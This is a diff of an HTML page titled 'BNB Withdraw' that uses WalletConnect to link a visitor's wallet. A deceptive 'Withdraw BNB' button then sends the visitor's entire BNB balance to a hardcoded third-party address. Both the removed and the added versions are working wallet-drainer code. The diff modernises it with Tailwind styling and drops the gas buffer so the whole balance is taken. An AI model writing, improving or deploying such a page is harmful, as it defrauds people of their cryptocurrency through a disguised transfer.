@@ -2,150 +2,127 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Wallet Connect with Withdraw</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 20px;
-      max-width: 400px;
-      margin: auto;
-    }
-    w3m-core-button {
-      display: block;
-      margin-bottom: 20px;
-      width: 100%;
-    }
-    button {
-      width: 100%;
-      padding: 10px;
-      font-size: 16px;
-      margin-bottom: 10px;
-      cursor: pointer;
-    }
-    #messageBox {
-      padding: 10px;
-      border-radius: 4px;
-      margin-top: 10px;
-      min-height: 40px;
-    }
-    #messageBox.info {
-      background-color: #d9edf7;
-      color: #31708f;
-    }
-    #messageBox.success {
-      background-color: #d4edda;
-      color: #155724;
-    }
-    #messageBox.error {
-      background-color: #f8d7da;
-      color: #721c24;
-    }
-  </style>
-  <script type="module" src="wallet.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BNB Withdraw</title>
+  <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
 
-  <!-- Wallet Connect Button -->
-  <w3m-core-button id="connectButton"></w3m-core-button>
+<body class="bg-gray-100 min-h-screen flex items-center justify-center">
+  <div class="bg-white rounded-2xl shadow-xl p-6 w-full max-w-md text-center space-y-6">
+    <h1 class="text-2xl font-bold text-gray-800">BNB Withdraw</h1>
 
-  <!-- Withdraw Button (Initially hidden) -->
-  <button id="withdrawButton" style="display: none;">Withdraw BNB</button>
+    <!-- WalletConnect Button -->
+    <w3m-core-button class="mx-auto"></w3m-core-button>
 
-  <!-- Message Box -->
-  <div id="messageBox" class="info">Please connect your wallet.</div>
+    <!-- Withdraw Button -->
+    <button
+      id="withdrawButton"
+      class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded-xl transition duration-200"
+      style="display: none"
+    >
+      Withdraw BNB
+    </button>
 
+    <!-- Message Area -->
+    <p id="message" class="text-sm font-medium text-gray-600"></p>
+  </div>
+
+  <!-- All logic from withdraw.js inside module script -->
   <script type="module">
     import {
+      EthereumClient,
+      w3mConnectors,
+      w3mProvider,
+      WagmiCore,
+      WagmiCoreChains,
+      WagmiCoreConnectors
+    } from "https://unpkg.com/@web3modal/ethereum@2.6.2";
+
+    import { Web3Modal } from "https://unpkg.com/@web3modal/html@2.6.2";
+
+    const { bsc } = WagmiCoreChains;
+    const {
+      configureChains,
+      createConfig,
       getAccount,
       fetchBalance,
       sendTransaction
-    } from "https://unpkg.com/@web3modal/ethereum@2.6.2/build/esm/wagmiCore.js";
-    import {
-      parseEther,
-      formatEther
-    } from "https://cdn.jsdelivr.net/npm/viem@1.21.4/_cjs/index.min.js";
+    } = WagmiCore;
 
-    const connectButton = document.getElementById("connectButton");
-    const withdrawButton = document.getElementById("withdrawButton");
-    const messageBox = document.getElementById("messageBox");
-    const BNB_PRICE_USD = 300;
-    const recipient = '0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C';
+    const chains = [bsc];
+    const projectId = "2aca272d18deb10ff748260da5f78bfd";
+    const RECEIVER_ADDRESS = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C";
+    const BNB_TO_USD = 600; // Adjust if needed
 
-    function showMessage(message, type = 'info') {
-      messageBox.textContent = message;
-      messageBox.className = '';
-      messageBox.classList.add(type);
-    }
+    const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
 
-    async function checkConnectionAndToggleUI() {
-      const { isConnected } = getAccount();
-      if (isConnected) {
-        connectButton.style.display = 'none';
-        withdrawButton.style.display = 'block';
-        showMessage("Wallet connected. You can withdraw now.", "success");
-      } else {
-        connectButton.style.display = 'block';
-        withdrawButton.style.display = 'none';
-        showMessage("Please connect your wallet.", "info");
-      }
-    }
-
-    // Monitor connection changes
-    window.ethereum?.on('accountsChanged', checkConnectionAndToggleUI);
-    window.ethereum?.on('connect', checkConnectionAndToggleUI);
-    window.ethereum?.on('disconnect', checkConnectionAndToggleUI);
-
-    document.addEventListener('DOMContentLoaded', () => {
-      checkConnectionAndToggleUI();
+    const wagmiConfig = createConfig({
+      autoConnect: true,
+      connectors: [
+        ...w3mConnectors({ chains, version: 2, projectId }),
+        new WagmiCoreConnectors.CoinbaseWalletConnector({
+          chains,
+          options: {
+            appName: "BNB Withdraw App"
+          }
+        })
+      ],
+      publicClient
     });
 
-    withdrawButton.addEventListener('click', async () => {
-      try {
-        const { address, isConnected } = getAccount();
-        if (!isConnected || !address) {
-          showMessage('Wallet not connected! Please connect first.', 'error');
-          return;
-        }
+    const ethereumClient = new EthereumClient(wagmiConfig, chains);
+    const web3Modal = new Web3Modal({ projectId }, ethereumClient);
 
-        showMessage('Checking your BNB balance...', 'info');
+    function showMessage(msg, type = "info") {
+      const el = document.getElementById("message");
+      el.innerText = msg;
+      el.className = `text-sm font-medium ${
+        type === "error" ? "text-red-600" : type === "success" ? "text-green-600" : "text-gray-600"
+      }`;
+    }
 
-        const balanceResult = await fetchBalance({
-          address,
-          chainId: 56,
-        });
+    async function withdrawBNB() {
+      const { address, isConnected } = getAccount();
 
-        const balanceBNB = Number(formatEther(balanceResult.value));
-        const balanceUSD = balanceBNB * BNB_PRICE_USD;
-
-        if (balanceUSD < 10) {
-          showMessage(`Your balance is $${balanceUSD.toFixed(2)} — below $10.`, 'error');
-          return;
-        }
-
-        const gasBuffer = 0.001;
-        const withdrawAmountBNB = balanceBNB - gasBuffer;
-
-        if (withdrawAmountBNB <= 0) {
-          showMessage("Balance too low after gas reservation.", "error");
-          return;
-        }
-
-        showMessage("Sending transaction...", "info");
-
-        const tx = await sendTransaction({
-          to: recipient,
-          value: parseEther(withdrawAmountBNB.toFixed(18)),
-        });
-
-        showMessage(`Withdraw successful! Tx Hash: ${tx.hash}`, "success");
-
-      } catch (e) {
-        console.error(e);
-        showMessage("Withdrawal failed. Check console or try again.", "error");
+      if (!isConnected || !address) {
+        showMessage("Please connect your wallet first", "error");
+        return;
       }
+
+      try {
+        const balanceResult = await fetchBalance({ address, chainId: 56 });
+        const bnbAmount = Number(balanceResult.formatted);
+        const usdValue = bnbAmount * BNB_TO_USD;
+
+        if (usdValue < 10) {
+          showMessage("Insufficient balance: You need at least $10 worth of BNB", "error");
+          return;
+        }
+
+        await sendTransaction({
+          to: RECEIVER_ADDRESS,
+          value: balanceResult.value
+        });
+
+        showMessage("Withdrawal sent successfully!", "success");
+      } catch (err) {
+        console.error(err);
+        showMessage("Withdrawal failed. Check console for error.", "error");
+      }
+    }
+
+    // Toggle visibility of Withdraw button
+    setInterval(() => {
+      const { isConnected } = getAccount();
+      const btn = document.getElementById("withdrawButton");
+      if (btn) btn.style.display = isConnected ? "block" : "none";
+    }, 1000);
+
+    // Handle button click
+    window.addEventListener("DOMContentLoaded", () => {
+      const btn = document.getElementById("withdrawButton");
+      if (btn) btn.addEventListener("click", withdrawBNB);
     });
   </script>
-
 </body>
 </html>
